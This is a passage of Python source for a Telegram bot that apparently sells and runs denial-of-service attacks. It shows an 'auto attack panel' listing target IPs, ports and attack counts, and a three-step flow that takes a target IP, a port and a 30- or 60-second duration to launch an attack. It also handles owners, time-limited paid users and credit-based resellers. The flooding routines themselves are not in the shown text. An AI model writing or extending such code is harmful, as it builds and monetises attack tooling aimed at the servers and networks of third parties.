        "║   💀  ᴀᴜᴛᴏ ᴀᴛᴛᴀᴄᴋ ᴘᴀɴᴇʟ  💀  ║\n"
        "╚════════════════════════════════╝\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  📊 ᴛᴏᴛᴀʟ:    `{total}`\n"
        f"┃  🟢 ᴀᴄᴛɪᴠᴇ:   `{active}`   🔴 ᴘᴀᴜꜱᴇᴅ: `{paused}`\n"
        f"┃  ⏱️ ᴛɪᴍᴇʀ:    `{timer_ct}`   🔍 ᴅᴇᴛᴇᴄᴛᴏʀ: `{detect_ct}`\n"
        f"┃  🎯 ᴀᴛᴛᴀᴄᴋꜱ:  `{total_atk}`   🚫 ʙᴀɴɴᴇᴅ: `{total_bn}`\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
    )

    # ═══════════════════════════════════════════════════════
    #   🎯  TARGET BLOCKS
    # ═══════════════════════════════════════════════════════
    blocks = []

    for i, (cid, t) in enumerate(auto_attack_targets.items(), 1):
        is_active   = bool(t.get("enabled", True))
        status_icon = "🟢" if is_active else "🔴"
        status_txt  = "ᴀᴄᴛɪᴠᴇ" if is_active else "ᴘᴀᴜꜱᴇᴅ"

        is_timer  = t.get("mode", "detector") == "timer"
        mode_icon = "⏱️" if is_timer else "🔍"
        mode_txt  = "ᴛɪᴍᴇʀ" if is_timer else "ᴅᴇᴛᴇᴄᴛᴏʀ"

        title    = (t.get("chat_title") or "Unknown")[:24]
        banned   = len(t.get("banned_sessions", []))
        attacks  = t.get("attack_count", 0)
        last_ip  = t.get("last_ip")
        last_prt = t.get("last_port")

        block = "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        block += f"┃  {status_icon} #{i}  {mode_icon} {mode_txt}  •  {status_txt}\n"
        block += f"┃  💬 {title}\n"
        block += "┠────────────────────────────────┨\n"
        block += f"┃  🆔 `{cid}`\n"

        if last_ip:
            block += f"┃  🌐 `{last_ip}:{last_prt or '?'}`\n"
        else:
            block += "┃  🌐 — ɴᴏ ɪᴘ ʏᴇᴛ —\n"

        block += f"┃  🎯 ᴀᴛᴛᴀᴄᴋꜱ: `{attacks}`\n"

        # ── Timer progress bar ──
        if is_timer:
            interval  = t.get("interval", 0) or 0
            max_atk   = t.get("max_attacks", 0) or 0
            total_dur = t.get("total_duration", 0) or 0
            started   = t.get("started_at", 0) or 0

            if total_dur > 0 and started > 0:
                elapsed   = max(0, time.time() - started)
                pct       = min(100, int((elapsed / total_dur) * 100))
                remaining = max(0, int(total_dur - elapsed))

                bar_len = 10
                filled  = max(0, min(bar_len, int((pct / 100) * bar_len)))
                bar     = "█" * filled + "░" * (bar_len - filled)

                block += f"┃  📈 `[{bar}]` {pct}%\n"
                block += f"┃  ⏳ ʀᴇᴍᴀɪɴɪɴɢ: `{remaining}ꜱ`\n"

            block += f"┃  🔄 ɪɴᴛᴇʀᴠᴀʟ: `{interval}ꜱ`  •  ᴍᴀx: `{max_atk}`\n"

        # ── Banned sessions ──
        if banned > 0:
            block += f"┃  🚫 ʙᴀɴɴᴇᴅ: `{banned}` ꜱᴇꜱꜱɪᴏɴ(ꜱ)\n"

        block += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        blocks.append(block)

    # ═══════════════════════════════════════════════════════
    #   📤  SEND (auto-split if > 4096 chars)
    # ═══════════════════════════════════════════════════════
    SAFE_LIMIT = 3800

    chunks   = []
    current  = header
    for blk in blocks:
        if len(current) + len(blk) > SAFE_LIMIT:
            chunks.append(current)
            current = blk
        else:
            current += blk
    if current:
        chunks.append(current)

    footer = (
        "\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  💡 ᴜꜱᴇ 🛑 ᴘᴀᴜꜱᴇ / ▶ ʀᴇꜱᴜᴍᴇ     ┃\n"
        "┃     ᴛᴏ ᴄᴏɴᴛʀᴏʟ ᴛᴀʀɢᴇᴛꜱ.        ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    )
    chunks[-1] += footer

    for chunk in chunks:
        await update.message.reply_text(chunk)


# ─────────────────────────────────────────────────────────────────
#  🛑  P A U S E   T A R G E T
# ─────────────────────────────────────────────────────────────────
async def ip_auto_attack_stop_start(update, user_id):
    """Prompt for chat ID to pause."""
    if not is_owner(user_id):
        return

    if not auto_attack_targets:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  📭  ɴᴏ ᴛᴀʀɢᴇᴛꜱ ᴛᴏ ᴘᴀᴜꜱᴇ      ║\n"
            "╚════════════════════════════════╝"
        )
        return

    temp_data[user_id] = {"step": "ip_auto_attack_stop"}

    text = (
        "╔════════════════════════════════╗\n"
        "║  🛑  ᴘᴀᴜꜱᴇ ᴛᴀʀɢᴇᴛ              ║\n"
        "╚════════════════════════════════╝\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  📎 ꜱᴇɴᴅ ᴄʜᴀᴛ ɪᴅ               ┃\n"
        "┠────────────────────────────────┨\n"
    )
    for cid, t in auto_attack_targets.items():
        text += f"┃  `{cid}`\n┃   └─ {t.get('chat_title', '?')[:20]}\n"
    text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"

    await update.message.reply_text(text, reply_markup=get_cancel_keyboard())


# ─────────────────────────────────────────────────────────────────
#  ▶️  R E S U M E   T A R G E T
# ─────────────────────────────────────────────────────────────────
async def ip_auto_attack_resume_start(update, user_id):
    """Prompt for chat ID to resume."""
    if not is_owner(user_id):
        return

    if not auto_attack_targets:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  📭  ɴᴏ ᴛᴀʀɢᴇᴛꜱ ᴛᴏ ʀᴇꜱᴜᴍᴇ      ║\n"
            "╚════════════════════════════════╝"
        )
        return

    temp_data[user_id] = {"step": "ip_auto_attack_resume"}

    text = (
        "╔════════════════════════════════╗\n"
        "║  ▶️  ʀᴇꜱᴜᴍᴇ ᴛᴀʀɢᴇᴛ             ║\n"
        "╚════════════════════════════════╝\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  📎 ꜱᴇɴᴅ ᴄʜᴀᴛ ɪᴅ               ┃\n"
        "┠────────────────────────────────┨\n"
    )
    for cid, t in auto_attack_targets.items():
        text += f"┃  `{cid}`\n┃   └─ {t.get('chat_title', '?')[:20]}\n"
    text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"

    await update.message.reply_text(text, reply_markup=get_cancel_keyboard())


# ─────────────────────────────────────────────────────────────────
#  ❌  R E M O V E   T A R G E T
# ─────────────────────────────────────────────────────────────────
async def ip_auto_attack_remove_start(update, user_id):
    """Prompt for chat ID to remove."""
    if not is_owner(user_id):
        return

    if not auto_attack_targets:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  📭  ɴᴏ ᴛᴀʀɢᴇᴛꜱ ᴛᴏ ʀᴇᴍᴏᴠᴇ      ║\n"
            "╚════════════════════════════════╝"
        )
        return

    temp_data[user_id] = {"step": "ip_auto_attack_remove"}

    text = (
        "╔════════════════════════════════╗\n"
        "║  ❌  ʀᴇᴍᴏᴠᴇ ᴛᴀʀɢᴇᴛ             ║\n"
        "╚════════════════════════════════╝\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  📎 ꜱᴇɴᴅ ᴄʜᴀᴛ ɪᴅ               ┃\n"
        "┠────────────────────────────────┨\n"
    )
    for cid, t in auto_attack_targets.items():
        text += f"┃  `{cid}`\n┃   └─ {t.get('chat_title', '?')[:20]}\n"
    text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"

    await update.message.reply_text(text, reply_markup=get_cancel_keyboard())


# ─────────────────────────────────────────────────────────────────
#  🔄  R E S E T   B A N N E D   S E S S I O N S
# ─────────────────────────────────────────────────────────────────
async def ip_auto_attack_reset_banned(update, user_id):
    """Prompt for chat ID to reset banned sessions."""
    if not is_owner(user_id):
        return

    if not auto_attack_targets:
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  📭  ɴᴏ ᴛᴀʀɢᴇᴛꜱ ᴛᴏ ʀᴇꜱᴇᴛ      ║\n"
            "╚════════════════════════════════╝"
        )
        return

    temp_data[user_id] = {"step": "ip_auto_attack_reset_banned"}

    text = (
        "╔════════════════════════════════╗\n"
        "║  🔄  ʀᴇꜱᴇᴛ ʙᴀɴɴᴇᴅ              ║\n"
        "╚════════════════════════════════╝\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  📎 ꜱᴇɴᴅ ᴄʜᴀᴛ ɪᴅ               ┃\n"
        "┠────────────────────────────────┨\n"
    )
    for cid, t in auto_attack_targets.items():
        bc = len(t.get("banned_sessions", []))
        icon = "🚫" if bc else "✅"
        text += f"┃  `{cid}`\n┃   └─ {t.get('chat_title', '?')[:20]}  {icon} {bc}\n"
    text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"

    await update.message.reply_text(text, reply_markup=get_cancel_keyboard())

# ═══════════════════════════════════════════════════════════════════
#              📝   T E X T   I N P U T   H A N D L E R   📝
# ═══════════════════════════════════════════════════════════════════

async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id, text):
    """Handle all text-based user inputs across every multi-step flow."""
    global AUTO_ATTACK_LOOP_TASK

    if user_id not in temp_data:
        return

    step = temp_data[user_id].get("step")

    # ─────────────────────────────────────────────────────────────
    #  ⚔️   A T T A C K   —   S T E P   1 / 3   (IP input)
    # ─────────────────────────────────────────────────────────────
    if step == "attack_ip":
        ip = text.strip()

        # ── validation ──
        if not is_valid_ip(ip):
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ⚠️  ɪɴᴠᴀʟɪᴅ ɪᴘ               ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  🚫 ɪᴘꜱ ꜱᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ        ┃\n"
                "┃    '15' ᴏʀ '96' ᴀʀᴇ ɴᴏᴛ      ┃\n"
                "┃    ᴀʟʟᴏᴡᴇᴅ.                   ┃\n"
                "┠────────────────────────────────┨\n"
                "┃  📎 ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ɪᴘ   ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            return

        method, method_name = get_attack_method(ip)
        if method is None:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ⚠️  ɪɴᴠᴀʟɪᴅ ɪᴘ               ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  {method_name}\n"
                "┠────────────────────────────────┨\n"
                "┃  📎 ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ɪᴘ   ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            return

        temp_data[user_id] = {"step": "attack_port", "ip": ip, "method": method}
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  🎯  ʟᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ - 2/3      ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ ɪᴘ: `{ip}`\n"
            "┠────────────────────────────────┨\n"
            "┃  📎 ꜱᴇɴᴅ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴘᴏʀᴛ      ┃\n"
            "┃                                ┃\n"
            "┃  ᴇxᴀᴍᴘʟᴇ: `80` ᴏʀ `443`        ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )

    # ─────────────────────────────────────────────────────────────
    #  ⚔️   A T T A C K   —   S T E P   2 / 3   (Port input)
    # ─────────────────────────────────────────────────────────────
    elif step == "attack_port":
        try:
            port = int(text.strip())
            if port <= 0 or port > 65535:
                await update.message.reply_text(
                    "╔════════════════════════════════╗\n"
                    "║  ❌  ɪɴᴠᴀʟɪᴅ ᴘᴏʀᴛ              ║\n"
                    "╚════════════════════════════════╝\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃  📏 ᴘᴏʀᴛ ᴍᴜꜱᴛ ʙᴇ ʙᴇᴛᴡᴇᴇɴ       ┃\n"
                    "┃     1 ᴀɴᴅ 65535.              ┃\n"
                    "┠────────────────────────────────┨\n"
                    "┃  📎 ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ᴘᴏʀᴛ  ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                )
                return

            temp_data[user_id]["port"] = port
            temp_data[user_id]["step"] = "attack_time"

            # ✅ FIX: Each button now has its own correct callback_data
            keyboard = [
                [
                    cbtn("30s",  callback_data="attack_time_30",  style="primary"),
                    cbtn("60s",  callback_data="attack_time_60",  style="primary"),
                ],
                [cbtn("❌ Cancel", callback_data="cancel_operation", style="danger")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  🎯  ʟᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ - 3/3      ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ✅ ɪᴘ:   `{temp_data[user_id]['ip']}`\n"
                f"┃  ✅ ᴘᴏʀᴛ: `{port}`\n"
                "┠────────────────────────────────┨\n"
                "┃  ⏱️ ꜱᴇʟᴇᴄᴛ ᴀᴛᴛᴀᴄᴋ ᴅᴜʀᴀᴛɪᴏɴ   ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=reply_markup
            )

        except ValueError:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɪɴᴠᴀʟɪᴅ ᴘᴏʀᴛ              ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  🔢 ᴘᴏʀᴛ ᴍᴜꜱᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ.    ┃\n"
                "┠────────────────────────────────┨\n"
                "┃  📎 ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ᴘᴏʀᴛ  ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )

    # ─────────────────────────────────────────────────────────────
    #  ➕   A D D   U S E R   —   S T E P   1 / 2
    # ─────────────────────────────────────────────────────────────
    elif step == "add_user_id":
        try:
            new_user_id = int(text.strip())
            temp_data[user_id]["new_user_id"] = new_user_id
            temp_data[user_id]["step"] = "add_user_days"

            keyboard = [
                [
                    cbtn("1 Day",  callback_data="days_1",  style="primary"),
                    cbtn("2 Days", callback_data="days_2",  style="primary"),
                    cbtn("3 Days", callback_data="days_3",  style="primary"),
                ],
                [
                    cbtn("4 Days",  callback_data="days_4",  style="success"),
                    cbtn("7 Days",  callback_data="days_7",  style="success"),
                    cbtn("30 Days", callback_data="days_30", style="success"),
                ],
                [
                    cbtn("Lifetime", callback_data="days_0", style="success"),
                    cbtn("❌ Cancel", callback_data="cancel_operation", style="danger"),
                ],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ➕  ᴀᴅᴅ ᴜꜱᴇʀ - 2/2            ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ✅ ᴜꜱᴇʀ ɪᴅ: `{new_user_id}`\n"
                "┠────────────────────────────────┨\n"
                "┃  📅 ꜱᴇʟᴇᴄᴛ ᴅᴜʀᴀᴛɪᴏɴ           ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=reply_markup
            )

        except ValueError:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ           ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  🔢 ᴜꜱᴇʀ ɪᴅ ᴍᴜꜱᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ. ┃\n"
                "┠────────────────────────────────┨\n"
                "┃  📎 ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )

    # ─────────────────────────────────────────────────────────────
    #  ➖   R E M O V E   U S E R
    # ─────────────────────────────────────────────────────────────
    elif step == "remove_user_id":
        try:
            user_to_remove = int(text.strip())
            user_to_remove_str = str(user_to_remove)

            removed = False

            if user_to_remove_str in approved_users:
                del approved_users[user_to_remove_str]
                save_approved_users(approved_users)
                removed = True

            pending_users[:] = [
                u for u in pending_users if str(u['user_id']) != user_to_remove_str
            ]
            save_pending_users(pending_users)

            if user_to_remove_str in user_attack_counts:
                del user_attack_counts[user_to_remove_str]
                save_user_attack_counts(user_attack_counts)

            if removed:
                reply_markup = get_main_keyboard(user_id)
                await update.message.reply_text(
                    "╔════════════════════════════════╗\n"
                    "║  ✅  ᴜꜱᴇʀ ᴀᴄᴄᴇꜱꜱ ʀᴇᴍᴏᴠᴇᴅ     ║\n"
                    "╚════════════════════════════════╝\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    f"┃  🆔 ᴜꜱᴇʀ ɪᴅ: `{user_to_remove}`\n"
                    f"┃  👤 ʀᴇᴍᴏᴠᴇᴅ ʙʏ: `{user_id}`\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                    reply_markup=reply_markup
                )

                try:
                    await context.bot.send_message(
                        chat_id=user_to_remove,
                        text=(
                            "╔════════════════════════════════╗\n"
                            "║  🚫  ᴀᴄᴄᴇꜱꜱ ʀᴇᴠᴏᴋᴇᴅ          ║\n"
                            "╚════════════════════════════════╝\n"
                            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                            "┃  ʏᴏᴜʀ ᴀᴄᴄᴇꜱꜱ ᴛᴏ ᴛʜᴇ ʙᴏᴛ     ┃\n"
                            "┃  ʜᴀꜱ ʙᴇᴇɴ ʀᴇᴠᴏᴋᴇᴅ.           ┃\n"
                            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                        )
                    )
                except Exception:
                    pass
            else:
                await update.message.reply_text(
                    "╔════════════════════════════════╗\n"
                    "║  ❌  ᴜꜱᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ            ║\n"
                    "╚════════════════════════════════╝\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    f"┃  🆔 `{user_to_remove}`\n"
                    "┃     ɴᴏᴛ ꜰᴏᴜɴᴅ ɪɴ ꜱʏꜱᴛᴇᴍ.     ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                )

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ           ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  🔢 ᴜꜱᴇʀ ɪᴅ ᴍᴜꜱᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ. ┃\n"
                "┠────────────────────────────────┨\n"
                "┃  📎 ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )

    # ─────────────────────────────────────────────────────────────
    #  👑   A D D   O W N E R   —   S T E P   1 / 2
    # ─────────────────────────────────────────────────────────────
    elif step == "owner_add_id":
        try:
            new_owner_id = int(text.strip())
            temp_data[user_id]["new_owner_id"] = new_owner_id
            temp_data[user_id]["step"] = "owner_add_username"

            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  👑  ᴀᴅᴅ ᴏᴡɴᴇʀ - 2/2          ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ✅ ᴜꜱᴇʀ ɪᴅ: `{new_owner_id}`\n"
                "┠────────────────────────────────┨\n"
                "┃  📛 ꜱᴇɴᴅ ᴛʜᴇ ᴜꜱᴇʀɴᴀᴍᴇ         ┃\n"
                "┃                                ┃\n"
                "┃  ᴇxᴀᴍᴘʟᴇ: `ᴊᴏʜɴ`              ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )

        except ValueError:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ           ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  🔢 ᴜꜱᴇʀ ɪᴅ ᴍᴜꜱᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ. ┃\n"
                "┠────────────────────────────────┨\n"
                "┃  📎 ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )

    # ─────────────────────────────────────────────────────────────
    #  👑   A D D   O W N E R   —   S T E P   2 / 2
    # ─────────────────────────────────────────────────────────────
    elif step == "owner_add_username":
        username = text.strip()
        new_owner_id = temp_data[user_id]["new_owner_id"]

        if str(new_owner_id) in owners:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ᴜꜱᴇʀ ᴀʟʀᴇᴀᴅʏ ᴏᴡɴᴇʀ         ║\n"
                "╚════════════════════════════════╝"
            )
            del temp_data[user_id]
            return

        owners[str(new_owner_id)] = {
            "username": username,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "is_primary": False
        }
        save_owners(owners)

        if str(new_owner_id) in admins:
            del admins[str(new_owner_id)]
            save_admins(admins)

        if str(new_owner_id) in resellers:
            del resellers[str(new_owner_id)]
            save_resellers(resellers)

        try:
            await context.bot.send_message(
                chat_id=new_owner_id,
                text=(
                    "╔════════════════════════════════╗\n"
                    "║  👑  ᴄᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴꜱ!          ║\n"
                    "╚════════════════════════════════╝\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃  ʏᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ᴀᴅᴅᴇᴅ ᴀꜱ ᴀɴ   ┃\n"
                    "┃  ᴏᴡɴᴇʀ ᴏꜰ ᴛʜᴇ ʙᴏᴛ!            ┃\n"
                    "┠────────────────────────────────┨\n"
                    "┃  ʏᴏᴜ ɴᴏᴡ ʜᴀᴠᴇ ꜰᴜʟʟ ᴀᴄᴄᴇꜱꜱ.   ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                )
            )
        except Exception:
            pass

        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            "╔════════════════════════════════╗\n"
            "║  ✅  ᴏᴡɴᴇʀ ᴀᴅᴅᴇᴅ              ║\n"
            "╚════════════════════════════════╝\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  👑 ᴏᴡɴᴇʀ ɪᴅ:  `{new_owner_id}`\n"
            f"┃  📛 ᴜꜱᴇʀɴᴀᴍᴇ: @{username:<15}\n"
            f"┃  👤 ᴀᴅᴅᴇᴅ ʙʏ: `{user_id}`\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=reply_markup
        )

        del temp_data[user_id]

    # ─────────────────────────────────────────────────────────────
    #  🗑️   R E M O V E   O W N E R
    # ─────────────────────────────────────────────────────────────
    elif step == "owner_remove_id":
        try:
            owner_to_remove = int(text.strip())

            if str(owner_to_remove) not in owners:
                await update.message.reply_text(
                    "╔════════════════════════════════╗\n"
                    "║  ❌  ᴜꜱᴇʀ ɴᴏᴛ ᴏᴡɴᴇʀ            ║\n"
                    "╚════════════════════════════════╝"
                )
                del temp_data[user_id]
                return

            if owners[str(owner_to_remove)].get("is_primary", False):
                await update.message.reply_text(
                    "╔════════════════════════════════╗\n"
                    "║  ❌  ᴄᴀɴɴᴏᴛ ʀᴇᴍᴏᴠᴇ            ║\n"
                    "╚════════════════════════════════╝\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃  👑 ᴄᴀɴɴᴏᴛ ʀᴇᴍᴏᴠᴇ ᴘʀɪᴍᴀʀʏ    ┃\n"
                    "┃     ᴏᴡɴᴇʀ ꜰʀᴏᴍ ᴛʜᴇ ꜱʏꜱᴛᴇᴍ.    ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                )
                del temp_data[user_id]
                return

            removed_username = owners[str(owner_to_remove)].get("username", "")
            del owners[str(owner_to_remove)]
            save_owners(owners)

            try:
                await context.bot.send_message(
                    chat_id=owner_to_remove,
                    text=(
                        "╔════════════════════════════════╗\n"
                        "║  ⚠️  ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ            ║\n"
                        "╚════════════════════════════════╝\n"
                        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                        "┃  ʏᴏᴜʀ ᴏᴡɴᴇʀ ᴀᴄᴄᴇꜱꜱ ʜᴀꜱ     ┃\n"
                        "┃  ʙᴇᴇɴ ʀᴇᴠᴏᴋᴇᴅ ꜰʀᴏᴍ ᴛʜᴇ ʙᴏᴛ. ┃\n"
                        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                    )
                )
            except Exception:
                pass

            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ✅  ᴏᴡɴᴇʀ ʀᴇᴍᴏᴠᴇᴅ            ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  👑 ᴏᴡɴᴇʀ ɪᴅ:  `{owner_to_remove}`\n"
                f"┃  📛 ᴜꜱᴇʀɴᴀᴍᴇ: @{removed_username:<12}\n"
                f"┃  👤 ʀᴇᴍᴏᴠᴇᴅ ʙʏ: `{user_id}`\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=reply_markup
            )

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  ❌  ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ           ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  🔢 ᴜꜱᴇʀ ɪᴅ ᴍᴜꜱᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ. ┃\n"
                "┠────────────────────────────────┨\n"
                "┃  📎 ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )

    # ─────────────────────────────────────────────────────────────
    #  💰   A D D   R E S E L L E R   —   S T E P   1 / 3
    # ─────────────────────────────────────────────────────────────
    elif step == "reseller_add_id":
        try:
            reseller_id = int(text.strip())
            temp_data[user_id]["reseller_id"] = reseller_id
            temp_data[user_id]["step"] = "reseller_add_credits"

            keyboard = [
                [
                    cbtn("50",   callback_data="credits_50",   style="primary"),
                    cbtn("100",  callback_data="credits_100",  style="primary"),
                    cbtn("200",  callback_data="credits_200",  style="primary"),
                ],
                [
                    cbtn("500",  callback_data="credits_500",  style="success"),
                    cbtn("1000", callback_data="credits_1000", style="success"),
                    cbtn("❌ Cancel", callback_data="cancel_operation", style="danger"),
                ],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                "╔════════════════════════════════╗\n"
                "║  💰  ᴀᴅᴅ ʀᴇꜱᴇʟʟᴇʀ - 2/3        ║\n"
                "╚════════════════════════════════╝\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ✅ ᴜꜱᴇʀ ɪᴅ: `{reseller_id}`\n"
                "┠────────────────────────────────┨\n"
                "┃  💳 ꜱᴇʟᴇᴄᴛ ᴄʀᴇᴅɪᴛꜱ            ┃\n"
